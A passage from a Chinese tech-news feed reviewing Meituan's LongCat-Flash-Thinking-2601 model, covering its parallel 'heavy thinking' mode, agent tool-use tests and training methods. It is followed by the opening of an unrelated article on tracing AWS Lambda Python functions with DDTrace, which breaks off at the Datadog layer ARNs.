<p>接下来，我们就把模型拉到真实场景里实测一番。</p>
<p>一手实测：这只龙猫有点强</p>
<p>我们先来试试数理逻辑推理，顺便看看这个重思考模式到底是怎么一回事。</p>
<p>「运动会招募志愿者，第一次招募了不到 100 人，其中男女比例为 11:7；补招若干女性志愿者后，男女比例为 4:3。问最多可能补招了多少名女性志愿者？」</p>
<p>在 longcat.ai 上开启「深度思考」后，便进入了重思考模式，此时 8 个 Thinker 同时开工，每个都表现出不同的思考风格。有的按常规解题，有的则直接写了个 Python 脚本。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3e4c817eccc4dd38ad390c843a0c0ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=wh2vnngooj2aK6Qqm6zNmnXFZGY%3D" alt="图片" loading="lazy"/></p>
<p>大部分 Thinker 给出了答案 5，其中 3 号和 6 号 Thinker 还写出详细的推导过程。待 8 个 Thinker 执行完任务后，模型再验证不同 Thinker 的思考过程，形成最终答案。</p>
<p>整个过程就像一个团队开会讨论问题，最后达成共识，最终给出的解答也更靠谱得多。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78e1c856ea1a42a98b89ddf96f3a6023~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=On85Jll%2FIThOIU4hCvktM1tQxLg%3D" alt="图片" loading="lazy"/></p>
<p>下面是道逻辑推理题。「A 的手机号码最后 5 位，由五个不同的数字组成。B 说：我猜它是 84261。C 说：我猜它是 26048。D 说：我猜它是 49280。A 说：巧了，你们每人都猜对了位置不相邻的两个数。你知道这五位号码是多少？」</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49d5d27aa6fd4c0e89f82684c4b465af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=DeZU9Z%2BroJZyaquRgobh0PrqXJo%3D" alt="图片" loading="lazy"/></p>
<p>8 个 Thinker 再次启动，各自从不同角度切入。</p>
<p>模型没有简单地按照「少数服从多数」的原则采纳意见，而是调用一段代码，系统验证答案是否满足所有约束条件，并穷举所有可能的组合，确认 86240 是唯一解。</p>
<p>这种将单个模型调用八次的模型编排方式，在技术实现上虽直接，却在实际效果上发挥出「三个臭皮匠顶过诸葛亮」的优势。</p>
<p>实测过程中，我们还发现了重思考模式的一种有趣玩法：投票。</p>
<p>举个例子，我们可以开启「深度思考」模式，然后让模型选出 2000 年代最优秀的华语流行歌手。</p>
<p>我们发现不同的 Thinker 会给出很不一样的答案，比如有一个仅选出了周杰伦、蔡依林、孙燕姿、王菲、陈奕迅五位代表，而另一个则直接列出了一长串名单。</p>
<p>最终，经过模型在总结阶段的汇总整理，LongCat-Flash-Thinking-2601 给出了一份涵盖多维度评估的名单，颇具参考性。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/987386cfb5b749788ec70698f18aee25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=TTl9BVgngWb2EiLWBuwWl40dB1c%3D" alt="图片" loading="lazy"/></p>
<p>我们又试了下该模型的编程能力。先让它生成一个 Flappy Bird 小游戏，效果很不错。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e7d795f656a4f5ea1f8cb8047e3bdd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=mtCSE3It08yMM6ooA9K5VY7J64M%3D" alt="图片" loading="lazy"/></p>
<p>Prompt：Make a game like flappy bird using HTML/CSS/JS in a single HTML file.</p>
<p>接下来我们又试了试让其编写一个康威生命游戏：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e714cfe2c0b40d8badc3bf0d278246f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=rrriv1QzjVJxWiJgBQmmzDC0YFA%3D" alt="图片" loading="lazy"/></p>
<p>Prompt：用 Python 写一个 Conway 生命游戏，提供可视化网格、暂停、单步和参数调节功能。</p>
<p>但实事求是地说，使用 8 个 Thinker 来完成编程任务的计算成本应当是比较高的，可能并不适合大规模应用（尽管目前该模型对普通用户免费），但是我们认为这种模式却非常适合医疗、金融、法律等可能需要多次深度思考来保证准确性的场景。</p>
<p>最后，我们再来测试一下 LongCat-Flash-Thinking-2601 模型主打的 Agent 能力，其中的核心便是工具调用。</p>
<p>为了方便用户测试，美团专门构建了一个「大模型工具使用测试」平台。该平台能基于关键词随机生成复杂的 OOD（分布外）任务，专门用来试探模型在陌生环境下的行动能力。</p>
<p>我们随机生成了一个「营养补给方案」任务。平台生成了一个包含近30个工具的复杂图谱。从页面右侧的依赖关系可以看出，这并非简单的线性调用，模型需要像经验丰富的营养学家，理清儿童营养需求分析、食物营养成分计算、过敏食物筛选等工具之间环环相扣的逻辑。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/526e3f218e9545f0bca436f66d6c5621~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=pziFrOw%2BLDv4U2WIlIj8EqRFkF0%3D" alt="图片" loading="lazy"/></p>
<p>更有趣的是，该平台还支持模型对比，让用户可以轻松地将 LongCat-Flash-Thinking 与其它模型放在同一起跑线上进行对比。</p>
<p>这里我们将其与当前大模型界的顶级选手 Claude 4.5 Opus 放在了同一个赛道上，进行同步竞技。</p>
<p>8 倍速视频</p>
<p>视频展示了两个模型在高频调用工具时的思考流。在任务完成后，系统会调用 AI 评估员，从执行速度与任务达成度两个维度进行复盘。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b00a398a840497f8f8e457b866aae5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=McE852dBdqeXh3KBTtAqtyD369c%3D" alt="图片" loading="lazy"/></p>
<p>在这个具体案例中，两个模型都交出了高分答卷，但 LongCat 成功达到了 100% 的标准覆盖率，而 Claude 4.5 Opus 却未能成功为用户创建健康档案，仅达到了 80% 的覆盖率。整体而言，LongCat 在处理工具依赖关系的响应节奏上展现出了更强的稳定性。</p>
<p>深入细节，我们可以看到这些工具的调用和输出都采用了标准的 JSON 格式，这也是当前大量的 MCP 或 API 工具采用的主流格式。这也意味着，我们可以非常轻松地将 LongCat-Flash-Thinking-2601 整合进到现有的工作流程中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9c68a22c3d24c408e377855c88f9b46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=RQrTlLqlsss4I0xnnaZES2QOPKg%3D" alt="图片" loading="lazy"/></p>
<p>强大实力的根基：重思考 + 智能体</p>
<p>那么，表现如此亮眼的 LongCat-Flash-Thinking-2601 究竟是如何炼成的？</p>
<p>正如其推文总结的那样，我们先给出几个关键词：并行思考、迭代式总结、环境规模扩展（Environment Scaling）、多环境大规模强化学习（Multi-Environment RL Scaling）、课程学习（Curriculum Learning）。另外，还有即将发布的 ZigZag Attention。</p>
<p>作为 LongCat-Flash-Thinking 的最新版本，2601 版本继承了上一版本的领域并行训练方案，而技术底座同样是参数总量达 560B 的高性能混合专家（MoE）架构模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58410df21e4b462cbfe566315040f11d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=2EP2BhTRGo6Kn2nSn88%2FteqkFd4%3D" alt="图片" loading="lazy"/></p>
<p>来自 LongCat-Flash-Thinking 技术报告</p>
<p>在此基础上，如上文评测所示，除了一些细节上的优化，这个新版本重点引入了两大改进：重思考模式和智能体能力。</p>
<p>该模型新引入的重思考模式别具一格，我们目前还未见其它任何模型显式或开源地提供类似模式。</p>
<p>而在智能体能力方面，美团引入了一套精心设计的流程。该流程结合了环境规模扩展与后续任务合成，并会在此之上进行可靠且高效的大规模、多环境强化学习。为更好地适应真实世界智能体任务中固有的噪声与不确定性，美团 LongCat 团队还对多种类型和不同强度的环境噪声进行了系统分析，并采用课程式训练，使模型在非理想条件下依然保持稳健表现。</p>
<p>下面我们就来更具体地看看美团的这些核心技术。</p>
<p>重思考模式：推理广度与深度的协同扩展</p>
<p>打开 longcat.ai 「深度思考」后开始体验，你第一时间就会被同时冒出的 8 个 Thinker 吸引注意。这正是 LongCat 团队提出的 Heavy Thinking Mode（重思考模式）的外在表现。它不仅看起来炫酷，更重要的是将推理能力推向了新的边界。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfec35b0c03142c09622933c1bd591e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=2FmQKWOA3KwlzwAPmvXMfPPUbZM%3D" alt="图片" loading="lazy"/></p>
<p>大致来看，其与 AI 大牛 Andrej Karpathy 实验性的<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzA3MzI4MjgzMw%3D%3D%26mid%3D2651003281%26idx%3D1%26sn%3D3d21baa1164c2afbbfc15c7b2fb5c847%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzA3MzI4MjgzMw==&amp;mid=2651003281&amp;idx=1&amp;sn=3d21baa1164c2afbbfc15c7b2fb5c847&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">大模型议会</a>项目有相似之处，但不同的是，Karpathy 的大模型议会是通过模型编排方式来向不同模型构成的集体提出问题，让它们各自发言并讨论后给出最终解答，而 LongCat-Flash-Thinking-2601 新引入的重思考模式则是并行地调用一个模型 8 次来实现高强度的并行思考。</p>
<p>如此一来，便可以同时获得多条相互独立的推理路径并进行交叉验证，从而显著降低偶然性错误，提升在复杂问题上的稳定性、可靠性与最终答案质量。如此一来，可以进一步提升模型在极具挑战性任务上的表现。</p>
<p>具体来说，该模式会将高难度问题求解分解为两个互补阶段：并行思考与总结，从而同时扩展推理的深度与宽度。</p>
<ul>
<li>
<p>在推理宽度方面，重思考模式会并行生成多条独立轨迹，以广泛探索不同推理路径，并采用相对较高的推理温度以保证多样性。</p>
</li>
<li>
<p>在推理深度方面，总结阶段生成的精炼轨迹可以递归反馈给总结模型，形成支持逐步加深推理的迭代推理回路。LongCat 团队还专门设计了额外的强化学习阶段来训练总结能力，进一步释放该模式的潜力。</p>
</li>
</ul>
<p>智能体能力提升：环境规模扩展与多环境强化学习</p>
<p>智能体能力方面，LongCat 团队精心设计了一套自动化环境规模扩展链路，并构建了一组多样且高质量的环境，作为工具调用类任务强化学习的训练场，使模型能够习得高层次、可泛化的智能体能力。</p>
<p>每个环境包含多达 60 余种工具，并以高密度依赖图的形式组织，提供了足够的复杂度以支持多样化任务构建与大规模探索。实验表明，随着训练环境数量的增加，模型在分布外（OOD）任务中的表现会持续提升（Environment Scaling）。</p>
<p>高质量任务构建</p>
<p>为确保训练任务集的质量，LongCat 团队对任务复杂度和多样性进行显式控制。每个任务都定义在从高质量环境中采样得到的连通子图之上，任务复杂度通过要求在该子图内尽可能多地协同使用工具来调节。为促进任务多样性，已选工具的再次采样概率会逐步降低。</p>
<p>LongCat 团队还构建了配套数据库以确保任务的可执行性，并验证每个任务至少存在一种可执行解。然而，当环境中包含大量工具时，跨数据库的一致性维护会变得困难，可能导致部分任务无法验证。针对这一问题，LongCat 团队设计了专门的应对策略，使训练的稳定性和有效性得到了充分保障。</p>
<p>多环境强化学习</p>
<p>在保持高效异步训练和流式 rollout 特性的同时，LongCat 团队进一步扩展了其强化学习基础设施 DORA（异步弹性共卡系统），以支持环境规模扩展下的大规模多环境智能体训练（Multi-Environment RL Scaling）。</p>
<p>具体而言，来自多个环境的任务会在每个训练批次中以平衡的方式混合，并根据任务复杂度和当前训练状态分配不同的 rollout 预算。</p>
<p>下图展示了该模型的多环境混合强化学习训练曲线，可以看到上涨的趋势非常稳定，这表明美团构建的基础设施和算法可以有效保证训练的稳定性。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d039c9fa3bd34c97ba3ff8f4e9f05c9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=C%2Bu0yAoEbNP4jl4Tvuk5%2BfZ3ZaE%3D" alt="图片" loading="lazy"/></p>
<p>下图则展示了多环境强化学习训练下，模型在不同 OOD 测试集上的 RL Scaling 表现，效果非常明显。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37c816c967b448e8b6f6e13ef31ba35e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=2INY5uPz1GVynPiJZR%2FMaCDzHqM%3D" alt="图片" loading="lazy"/></p>
<p>面向噪声环境的稳健训练</p>
<p>真实世界的智能体环境天然存在噪声和缺陷，仅在理想化环境中训练模型往往难以获得足够的稳健性。为此，LongCat 团队在训练过程中显式引入环境不完美因素，以提升模型的稳健性。</p>
<p>具体而言，LongCat 团队系统分析了智能体场景中真实世界噪声的主要来源，并设计了一套自动化流程，将这些噪声注入训练环境。在强化学习阶段，LongCat 团队采用课程式策略，随着训练推进逐步增加噪声的类型和强度。</p>
<p>下图展示了模型是否采取面向噪声环境的稳健训练，在带噪声 / 无噪声评测集下的表现对比，其中不同的评测集上依据特性添加了不同类型的噪声。可以看到，带噪声环境下未经过稳健训练的模型的表现会出现大幅衰减，Claude 也无法适应全部的噪声类型。而经过稳健训练后，LongCat-Flash-Thinking-2601（Training w/ Noise 组） 对环境的噪声和不确定性展现出了强大的适应能力，并在各类非理想条件下取得更优表现。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91ba01b5043c42f686435e6343449693~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=l2eURnPB8ge7IoHOCiQbRnUXFLg%3D" alt="图片" loading="lazy"/></p>
<p>得益于这些改进与创新，LongCat-Flash-Thinking-2601 不仅在智能体工具使用、智能体搜索以及工具融合推理等基准测试中达到顶尖水平，还在任意的 OOD（分布外）真实世界智能体场景中展现出显著提升的泛化能力。</p>
<p>LongCat ZigZag Attention：实现超长上下文</p>
<p>LongCat ZigZag Attention，顾名思义，是一种注意力机制，根据其官方推文描述，其一大核心亮点是能「实现 100 万 token 上下文」。据悉，LongCat ZigZag Attention 已被成功用于训练当前 LongCat-Flash-Thinking 模型的一个分支，我们也将很快见证这个分支版本面世。细节详见论文：<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.23966" target="_blank" title="https://arxiv.org/abs/2512.23966" ref="nofollow noopener noreferrer">arxiv.org/abs/2512.23…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/106bfb57137e43e9a9ed3eb42e19fdfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=bT%2FP%2FRGIdF3yQZ04rQesz4pwQjM%3D" alt="图片" loading="lazy"/></p>
<p>One More Thing</p>
<p>回头来看，美团大模型站到台前时间并不算长但节奏清晰，首次亮相在 2025 年 9 月，此后保持了每月一更的开源节奏，不断扩容自己的能力库：从强调响应速度的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzA3MzI4MjgzMw%3D%3D%26mid%3D2650988704%26idx%3D1%26sn%3Dda107de5f4054028060a334398147912%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzA3MzI4MjgzMw==&amp;mid=2650988704&amp;idx=1&amp;sn=da107de5f4054028060a334398147912&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">LongCat-Flash-Chat</a> 到专注逻辑的 Thinking 版本，再到覆盖多模态的 Omni 版本，每一步迭代都在让这只龙猫能够更好地理解这个世界，并让复杂的现实生活变得更加可计算。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55edc5bb60574adea2d6a85cf0c19b5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769164639&amp;x-signature=LT%2F6Ik85hg2wBZUwTIaZe20Z7WQ%3D" alt="图片" loading="lazy"/></p>
<p>美团在 Hugging Face 上的论文页面</p>
<p>这一次，龙猫聚焦 Agent 与 Thinking 能力进行全面提升，也是实现了一次从理解到融入真实世界的跃迁。</p>
<p>或许，美团现在追求的，就是一种确定性：能够用技术在真实世界中又好又快地解决问题，终有一天让「模型即服务」。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AWS Lambda Python 应用可观测最佳实践（DDTrace）]]></title>    <link>https://juejin.cn/post/7595837635569762356</link>    <guid>https://juejin.cn/post/7595837635569762356</guid>    <pubDate>2026-01-16T10:49:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595837635569762356" data-draft-id="7595831648824410152" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AWS Lambda Python 应用可观测最佳实践（DDTrace）"/> <meta itemprop="keywords" content="AWS"/> <meta itemprop="datePublished" content="2026-01-16T10:49:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="可观测性用观测云"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AWS Lambda Python 应用可观测最佳实践（DDTrace）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    可观测性用观测云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:49:47.000Z" title="Fri Jan 16 2026 10:49:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>随着企业核心业务全面向云原生和无服务器架构迁移，AWS Lambda 因其免运维、自动扩缩容和按调用计费的优势，已成为支撑高并发、事件驱动型业务的首选计算平台。然而，Serverless 的“黑盒化”特征也带来了新的可观测性挑战：</p>
<ul>
<li>分布式链路断裂：Lambda 函数往往作为事件触发链中的关键一环，与 API Gateway、S3、SQS、DynamoDB 等服务交叉调用，传统 APM 难以串联完整调用链。</li>
<li>冷启动与性能瓶颈难定位：函数初始化耗时、依赖库加载、网络延迟等性能指标缺乏细粒度追踪，影响用户体验与成本控制。</li>
<li>多环境、多账号下的观测一致性缺失：Dev、QA、Prod 环境函数数量众多，若没有统一的链路标准和标签规范，问题定位效率低，跨团队协作成本高。</li>
</ul>
<p>为保障线上稳定性、优化函数性能、实现 Serverless 场景下的可观测闭环，亟需基于 Python 运行时 构建一套标准化方案，提供从原理、代码示例到生产级部署的完整落地方案，助力企业在 Serverless 架构下实现“<strong>问题可追踪、性能可量化、成本可优化</strong>”的目标。</p>
<p>本文介绍如何通过 Lambda 服务接入 DDTrace 组件实现链路数据采集并上报至观测云。</p>
<h2 data-id="heading-1">实践</h2>
<h3 data-id="heading-2">运行环境</h3>
<ul>
<li>Lambda 函数（Zip 部署）</li>
<li>Runtime Language：Python (3.8-3.13)</li>
</ul>
<h3 data-id="heading-3">准备 Lambda Layer</h3>
<p>需要新增以下两个 Layer：</p>
<ul>
<li>DataDog Layer：用于链路插桩</li>
<li>DataKit Layer: 用于接收 datadog 的可观测数据</li>
</ul>
<h3 data-id="heading-4">新增 DataKit Layer</h3>
<p>参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.guance.com%2Fintegrations%2Fawslambda%2F%23layer" target="_blank" title="https://docs.guance.com/integrations/awslambda/#layer" ref="nofollow noopener noreferrer">AWS Lambda 扩展 &gt; 添加 DataKit 层</a></p>
<h3 data-id="heading-5">新增 DataDog Layer</h3>
<ul>
<li>AWS 全球区</li>
</ul>
<p>选择合适的 ARN：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># Use this format for x86-based Lambda deployed in AWS commercial regions</span>
<span class="hljs-symbol">arn:</span><span class="hljs-symbol">aws:</span><span class="hljs-symbol">lambda:</span>&lt;<span class="hljs-variable constant_">AWS_REGION</span>&gt;<span class="hljs-symbol">:</span><span class="hljs-number">464622532012</span><span class="hljs-symbol">:layer</span><span class="hljs-symbol">:Datadog-&lt;RUNTIME&gt;</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span>

<span class="hljs-comment"># Use this format for arm64-based Lambda deployed in AWS commercial regions</span>
<span class="hljs-symbol">arn:</span><span class="hljs-symbol">aws:</span><span class="hljs-symbol">lambda:</span>&lt;<span class="hljs-variable constant_">AWS_REGION</span>&gt;<span class="hljs-symbol">:</span><span class="hljs-number">464622532012</span><span class="hljs-symbol">:layer</span><span class="hljs-symbol">:Datadog-&lt;RUNTIME&gt;-ARM</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span>

<span class="hljs-comment"># Use this format for x86-based Lambda deployed in AWS GovCloud regions</span>
